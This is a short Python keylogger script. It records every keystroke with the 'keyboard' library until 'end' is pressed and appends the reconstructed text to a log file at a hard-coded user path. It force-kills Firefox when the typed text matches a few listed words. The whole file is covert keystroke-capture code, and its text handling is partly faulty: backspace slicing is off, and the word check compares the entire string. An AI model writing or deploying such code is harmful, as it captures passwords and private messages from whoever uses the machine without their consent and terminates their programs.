



try:
    import os
    import sys
    import keyboard
except:
    os.system('pip install keyboard')
    import keyboard
    import sys

string = ''
offensive_words = ('porn', 'sex', 'fuck')
file_path = 'C:\\Users\\DEEPAK-PC\\Desktop\\log.txt' if sys.platform == 'win32' else '/home/deepak/Downloads/log.txt'
logger = keyboard.record(until='end')
with open(file_path, 'a+') as fp:
    fp.write('\n')
    for key in logger:
        if key.event_type == 'up':
            if key.name == 'space':
                string += ' '
            elif key.name == 'esc':
                string += key.name
                string = string[:-(len(key.name))]
            elif key.name == 'backspace':
                string += key.name
                string = string[:-(len(key.name)+1)]
            elif key.name == 'enter':
                string += ' '
                string += key.name.upper()
                string += '\n'
            else:
                string += key.name
    if 'shift2' in string:
        string = string.replace('shift2', '@')
        if 'shift right' in string:
            string = string.replace('shift right', '')
    if string.lower() in offensive_words:
        os.system("taskkill /im firefox.exe /f")
    fp.write(string)
